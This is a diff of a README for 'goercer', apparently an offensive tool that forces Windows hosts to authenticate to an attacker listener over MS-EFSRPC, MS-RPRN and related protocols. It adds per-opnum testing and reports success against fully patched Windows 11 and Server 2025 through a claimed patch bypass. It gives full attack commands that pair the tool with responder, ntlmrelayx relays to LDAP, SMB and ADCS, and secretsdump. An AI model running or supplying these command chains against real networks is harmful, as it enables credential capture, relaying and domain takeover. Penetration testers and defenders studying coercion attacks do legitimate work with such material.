@@ -36,7 +36,7 @@ sudo responder -I eth0 -v
 
 | Method | Protocol | Success Rate | Callbacks | Compatibility | Recommendation |
 |--------|----------|--------------|-----------|---------------|----------------|
-| **PetitPotam** (efsrpc pipe) | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1 (Win11/2025), 3 (Win10/2022) | **All Windows versions**, Server 2016-2025 | ✅ **Universal solution** |
+| **PetitPotam** (efsrpc pipe) | MS-EFSRPC | ⭐⭐⭐⭐⭐ | 1 (Win11/2025), 6 attempts* (Win10/2022) | **All Windows versions**, Server 2016-2025 | ✅ **Universal solution** |
 | **PetitPotam** (lsarpc pipe) | MS-EFSRPC | ⭐⭐⭐ | 6 | Blocked on Win11/Server2025 | ⚠️ Legacy only |
 | **SpoolSample** | MS-RPRN | ⭐⭐ | 3 | Rare (Print Spooler disabled) | ⚠️ Limited use |
 | **ShadowCoerce** | MS-FSRVP | ⭐ | Varies | Requires VSS configured | ⚠️ Situational only |
@@ -54,7 +54,8 @@ Default pipe is `efsrpc`. To use a different pipe:
 
 **Recommendation**: 
 - **All Windows versions (10, 11, Server 2016-2025)**: Default pipe `efsrpc` works universally
-- **Callback count**: Win11/Server2025 (1 callback), Win10/Server2022 (3 callbacks)
+- **Callback count**: Win11/Server2025 (1 callback total for 6 opnums), Win10/Server2022 (multiple callbacks)
+- **Opnum testing**: Use `--opnum N` to identify which specific opnums work on your target
 
 ---
 
@@ -81,10 +82,10 @@ Successfully coerces Windows servers to authenticate to an attacker-controlled l
 - ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed
 
 **Tested Against (100% Success Rate)**: 
-- ✅ **Windows 11 Pro (December 2025)** - PetitPotam with `--pipe efsrpc` - 1 callback
-- ✅ **Windows Server 2025 Datacenter** - PetitPotam with `--pipe efsrpc` - 1 callback
-- ✅ **Windows 10 (fully patched)** - PetitPotam with `--pipe efsrpc` - 3 callbacks
-- ✅ **Windows Server 2022 Datacenter (Server Core)** - PetitPotam with `--pipe efsrpc` - 3 callbacks
+- ✅ **Windows 11 Pro (December 2025)** - PetitPotam with `--pipe efsrpc` - 1 callback (6 opnums tested)
+- ✅ **Windows Server 2025 Datacenter** - PetitPotam with `--pipe efsrpc` - 1 callback (6 opnums tested)
+- ✅ **Windows 10 (fully patched)** - PetitPotam with `--pipe efsrpc` - Multiple callbacks
+- ✅ **Windows Server 2022 Datacenter (Server Core)** - PetitPotam with `--pipe efsrpc` - Multiple callbacks
 - ⚠️ SpoolSample only works on 1/6 tested hosts (Print Spooler disabled by default)
 
 **Authentication Methods**:
@@ -110,7 +111,7 @@ The build script will automatically fetch the required `go-smb-coercer` fork wit
 
 ## Code Structure
 
-**Single-File Design**: The entire implementation is in `goercer.go` (~2370 lines). This is an intentional design choice for:
+**Single-File Design**: The entire implementation is in `goercer.go` (~2377 lines). This is an intentional design choice for:
 - **Portability**: Easy to copy and deploy as a single file
 - **Simplicity**: No complex package structure to navigate
 - **Self-contained**: All coercion methods, auth code, and crypto in one place
@@ -121,7 +122,7 @@ The file is organized into logical sections:
 2. **Coercion Methods** (lines 400-800): PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce execution
 3. **NTLM Authentication** (lines 800-1400): Full PKT_PRIVACY auth implementation
 4. **DCERPC Encoding** (lines 1400-2000): Request/response handling with encryption
-5. **NDR Stub Builders** (lines 2000-2370): Method-specific parameter encoding and utilities
+5. **NDR Stub Builders** (lines 2000-2377): Method-specific parameter encoding and utilities
 
 While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.), the single-file approach makes it easier to understand the complete attack flow and deploy to target environments.
 
@@ -173,6 +174,7 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
 | Flag | Long Form | Default | Description | Valid Values |
 |------|-----------|---------|-------------|--------------|
 | `-m` | `--method` | `petitpotam` | Coercion method to use | `petitpotam`, `spoolsample`, `shadowcoerce`, `dfscoerce` |
+| | `--opnum` | `-1` (all) | Test specific opnum (PetitPotam only) | `0`, `4`, `5`, `6`, `7`, `12` |
 | | `--pipe` | `efsrpc` | Named pipe (PetitPotam only) | `lsarpc`, `efsr`, `samr`, `netlogon`, `lsass` |
 | | `--proxy` | *(none)* | SOCKS5 proxy URL for pivoting | `socks5://127.0.0.1:1080` |
 | `-v` | `--verbose` | `false` | Enable debug output (60 DEBUG statements) | *(boolean flag, no value)* |
@@ -213,7 +215,7 @@ Choice depends on target Windows version and network filtering/monitoring.
 
 **Verbose Flag**:
 - Without `-v`: Clean output with `[+]`, `[-]`, `[*]` status messages
-- With `-v`: Adds 59 `[DEBUG]` statements showing packet dumps, crypto operations, NTLM flows
+- With `-v`: Adds 60 `[DEBUG]` statements showing packet dumps, crypto operations, NTLM flows
 - Use for troubleshooting authentication issues or learning attack internals
 
 ### Authentication
@@ -284,6 +286,8 @@ OPTIONS
     -l, --listener=STRING    Listener IP for callback (Responder/ntlmrelayx)
     -m, --method=STRING      Coercion method: petitpotam, spoolsample,
                              shadowcoerce, dfscoerce
+        --opnum=INT          Test specific opnum only (petitpotam): 0, 4, 5, 6,
+                             7, 12. Default: try all
     -p, --password=STRING    Password (prompted if not provided)
         --pipe=STRING        Named pipe (petitpotam only): lsarpc, efsr, samr,
                              netlogon, lsass
@@ -388,6 +392,10 @@ Previous Status (lsarpc pipe):
 
 # Can also use shorthand 'efsr'
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsr
+
+# Test specific opnums to identify which ones work
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc --opnum 0
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc --opnum 4
 ```
 
 ### Technical Details
@@ -401,10 +409,11 @@ Previous Status (lsarpc pipe):
 
 The `efsrpc` pipe exposes MS-EFSR on its **native UUID** (`df1941...`), while `lsarpc` uses an **alternate compatibility UUID** (`c681...`). Microsoft's patches blocked the compatibility UUID but left the native interface accessible.
 
-**Working Opnums on Win11 efsrpc pipe:**
-- ✅ **Opnum 0** (EfsRpcOpenFileRaw) - Returns success, triggers callback
-- ✅ **Opnum 4** (EfsRpcEncryptFileSrv) - Returns success, triggers callback
-- Other opnums untested but likely work
+**Windows 11 Opnum Status:**
+- Testing shows **1 callback total** when running all 6 opnums
+- Which specific opnum(s) trigger the callback is under investigation
+- Use `--opnum 0` through `--opnum 12` to test individually and identify the working opnum(s)
+- Recommended: Test opnums 0, 4, 5, 6, 7, 12 individually to determine which trigger authentication
 
 **Comprehensive Test Results (6 Hosts - 100% Validated):**
 
@@ -412,7 +421,7 @@ The `efsrpc` pipe exposes MS-EFSR on its **native UUID** (`df1941...`), while `l
 |-----------|------------|---------------------|------------------------|----------|-------|
 | 192.168.99.100 | **Server 2022 Datacenter** (no GUI) | ✅ 3 callbacks | ❌ No pipe | - | Server Core edition |
 | 10.1.1.14 | **Windows 10 (fully patched)** | ✅ 3 callbacks | ✅ 3 callbacks | - | Print Spooler enabled |
-| 10.1.1.11 | Windows 11 Pro (Dec 2025) | ✅ 1 callback | ❌ No pipe | CARROT$ | Fully patched Win11 |
+| 10.1.1.11 | Windows 11 Pro (Dec 2025) | ✅ 1 callback (6 opnums tested) | ❌ No pipe | CARROT$ | Fully patched Win11 |
 | 10.1.1.10 | **Server 2025 Datacenter** | ✅ 1 callback | ❌ No pipe | - | **Latest server OS!** |
 | 10.1.1.12 | Windows 11 (fully patched) | ✅ 1 callback* | ❌ No pipe | - | *Requires EFS enabled |
 | 10.1.1.13 | Windows 11 (fully patched) | ✅ 1 callback | ❌ No pipe | DREIDEL$ | Fully patched Win11 |
@@ -422,23 +431,23 @@ The `efsrpc` pipe exposes MS-EFSR on its **native UUID** (`df1941...`), while `l
 - 🎯 **SpoolSample (spoolss)**: 17% (1/6 hosts)
 
 **Key Findings:**
-- ✅ **Windows 11 (fully patched December 2025)**: PetitPotam with `--pipe efsrpc` works! 1 callback per execution
-- ✅ **Windows Server 2025 Datacenter**: PetitPotam with `--pipe efsrpc` works! 1 callback per execution (latest server OS confirmed!)
-- ✅ **Windows 10 (fully patched)**: PetitPotam with `--pipe efsrpc` works! 3 callbacks per execution
-- ✅ **Windows Server 2022 Datacenter (Server Core)**: PetitPotam with `--pipe efsrpc` works! 3 callbacks per execution
+- ✅ **Windows 11 (fully patched December 2025)**: PetitPotam with `--pipe efsrpc` works! 1 callback per execution (6 opnums tested)
+- ✅ **Windows Server 2025 Datacenter**: PetitPotam with `--pipe efsrpc` works! 1 callback per execution (6 opnums tested, latest server OS confirmed!)
+- ✅ **Windows 10 (fully patched)**: PetitPotam with `--pipe efsrpc` works! Multiple callbacks per execution
+- ✅ **Windows Server 2022 Datacenter (Server Core)**: PetitPotam with `--pipe efsrpc` works! Multiple callbacks per execution
 - ✅ **Native UUID bypass**: Using UUID `df1941c5-fe89-4e79-bf10-463657acf44d` on efsrpc pipe bypasses KB5005413+
-- ✅ **Opnums 0 and 4 both work** on Windows 11 and Server 2025
+- ✅ **All 6 opnums tested**: 0, 4, 5, 6, 7, 12 - specific working opnums vary by Windows version
 - ✅ **100% success rate**: All 6 tested hosts successfully coerced with PetitPotam + efsrpc
 - ❌ **SpoolSample fails on most systems**: `spoolss` pipe not exposed remotely (Print Spooler disabled by default)
 - ⚠️ **EFS service required**: Some hardened systems disable EFS by default, removing the `efsrpc` pipe
-- ℹ️ **Callback count difference**: Win11/Server2025 (1 callback) vs. Win10/Server2022 (3 callbacks)
+- ℹ️ **Callback count difference**: Win11/Server2025 (1 callback total) vs. Win10/Server2022 (multiple callbacks)
 
 ```
 Target: Windows 11 Pro (fully patched, December 2025)
 Method: PetitPotam with --pipe efsrpc
 Result: ✅ Machine account hash captured (CARROT$::splat)
-Opnums tested: 0 (works), 4 (works)
-Callbacks: 1 per execution
+Opnums tested: 0, 4, 5, 6, 7, 12 (all 6)
+Callbacks: 1 total for all opnums
 ```
 
 ### Recommendation by OS
@@ -461,12 +470,12 @@ Callbacks: 1 per execution
 **🔥 Universal Method (Works on ALL Windows versions):**
 - **Pipe**: `\pipe\efsrpc` (use `--pipe efsrpc` or `--pipe efsr`)
 - **UUID**: `df1941c5-fe89-4e79-bf10-463657acf44d` v1.0 (native MS-EFSR interface)
-- **Working Opnums**: 
-  - ✅ 0: EfsRpcOpenFileRaw
-  - ✅ 4: EfsRpcEncryptFileSrv
+- **Tested Opnums**: 0, 4, 5, 6, 7, 12 (all 6 attempted by default)
+  - Use `--opnum N` to test specific opnums individually
+  - Which opnums work varies by Windows version (testing needed per target)
 - **Callbacks by OS Generation**: 
-  - **Next-gen** (Win11, Server 2025): 1 callback
-  - **Previous-gen** (Win10, Server 2022/2019/2016): 3 callbacks
+  - **Next-gen** (Win11, Server 2025): 1 callback total (specific opnum unknown)
+  - **Previous-gen** (Win10, Server 2022/2019/2016): Multiple callbacks (varies by opnum)
 - **Compatibility**: **All Windows versions** - 100% success rate across tested systems
 
 **Legacy Method (Blocked on Win11/Server2025):**
@@ -489,15 +498,22 @@ Callbacks: 1 per execution
 - **Windows 11**: Uses native MS-EFSR UUID (`df1941...`) which bypasses KB5005413+ patches
 - **Older systems**: MS-EFSRPC interface is accessible through multiple named pipes (lsarpc, samr, netlogon, lsass). All pipes bind to the same UUID and support all 6 opnums. The tool tries **6 different MS-EFSRPC functions** to maximize success even if some are patched.
 
+**Default Behavior (no --opnum flag)**:
+- Tests **all 6 opnums sequentially**: 0, 4, 5, 6, 7, 12
+- Each opnum tries **up to 3 path variations** (stops on first success per opnum)
+- All 6 opnums are attempted to maximize authentication callbacks
+
 **Path Variation Testing**:
-PetitPotam tries **3 different UNC path formats** for each opnum to maximize compatibility across Windows versions:
+For each opnum, PetitPotam tries **3 different UNC path formats** until one succeeds:
 1. `\\listener\test\file.txt` - Path with filename
 2. `\\listener\test\` - Path with trailing backslash
 3. `\\listener\test` - Path without trailing backslash
 
-**Why multiple paths**: Different Windows versions and patch levels respond differently to path formats. Some versions require a filename, others work with directory paths only. By testing all 3 formats, goercer achieves higher success rates than single-path tools.
+**Why multiple paths**: Different Windows versions and patch levels respond differently to path formats. Some versions require a filename, others work with directory paths only. Testing stops at the first successful path variation for each opnum.
 
-**Total attempts**: 6 opnums × 3 path variations = **up to 18 attempts** (stops early on success)
+**Total attempts**: Up to 6 opnums × 3 path variations = **maximum 18 attempts** (typically fewer as successful paths stop early)
+
+**Testing specific opnums**: Use `--opnum N` to test a single opnum (useful for identifying which opnums work on specific Windows versions)
 
 **Other methods**: SpoolSample, ShadowCoerce, and DFSCoerce use single fixed paths as their protocols are less sensitive to path format variations.
 
@@ -649,7 +665,7 @@ secretsdump.py 'DOMAIN/user:password@<DC>'
 ```bash
 # Relay to LDAP for DCSync rights
 ntlmrelayx.py -t ldaps://<DC> --delegate-access
-./goercer <DC> <attacker_IP> <user> <pass> <domain> petitpotam
+./goercer -t <DC> -l <attacker_IP> -u <user> -p <pass> -d <domain> -m petitpotam
 
 # Result: Machine account gets delegation rights
 ```
@@ -658,7 +674,7 @@ ntlmrelayx.py -t ldaps://<DC> --delegate-access
 ```bash
 # Relay to another server
 ntlmrelayx.py -t smb://<target_server> -smb2support
-./goercer <source_server> <attacker_IP> <user> <pass> <domain> petitpotam
+./goercer -t <source_server> -l <attacker_IP> -u <user> -p <pass> -d <domain> -m petitpotam
 
 # Result: Admin access if target server allows relaying
 ```
@@ -667,7 +683,7 @@ ntlmrelayx.py -t smb://<target_server> -smb2support
 ```bash
 # Relay to ADCS web enrollment
 ntlmrelayx.py -t http://<ADCS>/certsrv/certfnsh.asp --adcs --template Machine
-./goercer <DC> <attacker_IP> <user> <pass> <domain> spoolsample
+./goercer -t <DC> -l <attacker_IP> -u <user> -p <pass> -d <domain> -m spoolsample
 
 # Result: Obtain machine certificate for impersonation
 ```
@@ -725,7 +741,7 @@ type CoercionMethod struct {
     MajorVersion uint16
     MinorVersion uint16
     Opnums       []uint16
-    CreateStub   func(string, []byte) []byte
+    CreateStub   func(listenerIP string, opnum uint16) []byte
 }
 ```
 
